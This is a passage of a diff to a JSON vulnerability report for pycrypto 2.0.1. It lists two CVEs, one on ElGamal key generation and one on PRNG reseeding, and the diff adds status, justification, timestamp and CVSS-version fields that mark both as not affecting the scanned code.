           "description": "BUGTRAQ  ID: 53687\r\nCVE ID: CVE-2012-2417\r\n\r\nPyCrypto\u662f\u4f7f\u7528Python\u7f16\u5199\u7684\u52a0\u5bc6\u5de5\u5177\u5305\u3002\r\n\r\nPyCrypto 2.5\u4e4b\u524d\u7248\u672c\u5728\u4f7f\u7528ElGamal\u65b9\u6848\u751f\u6210\u5bc6\u94a5\u65f6\u5b58\u5728\u9519\u8bef\uff0c\u53ef\u9020\u6210\u7f29\u51cf\u5bc6\u94a5\u7a7a\u95f4\uff0c\u53ef\u88ab\u5229\u7528\u751f\u6210\u79c1\u94a5\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002\n0\npython 2.5.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPython\r\n------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nwww.python.org",
           "payload": ""
         }
       ],
-      "priority": 3.03
+      "priority": 3.03,
+      "timestamp": "2024-08-29 11:04:13.177841",
+      "last_updated": "2024-08-29 11:04:13.177841",
+      "status": "not_affected",
+      "justification": "vulnerable_code_not_present"
     },
     {
       "affected_component": "pycrypto",
       "affected_component_version": "2.0.1",
+      "affected_component_manager": "pypi",
       "vulnerability": {
         "@id": "https://nvd.nist.gov/vuln/detail/CVE-2013-1445",
         "name": "CVE-2013-1445",
         "description": "The Crypto.Random.atfork function in PyCrypto before 2.6.1 does not properly reseed the pseudo-random number generator (PRNG) before allowing a child process to access it, which makes it easier for context-dependent attackers to obtain sensitive information by leveraging a race condition in which a child process is created and accesses the PRNG within the same rate-limit period as another process.",
         "cvss": {
           "vuln_impact": 2.9,
+          "version": "2.0",
           "attack_vector": "AV:N/AC:M/Au:N/C:P/I:N/A:N"
         }
       },
-      "priority": 2.03
+      "priority": 2.03,
+      "timestamp": "2024-08-29 11:04:13.177841",
+      "last_updated": "2024-08-29 11:04:13.177841",
+      "status": "not_affected",
+      "justification": "vulnerable_code_not_present"
     }
   ]
 }
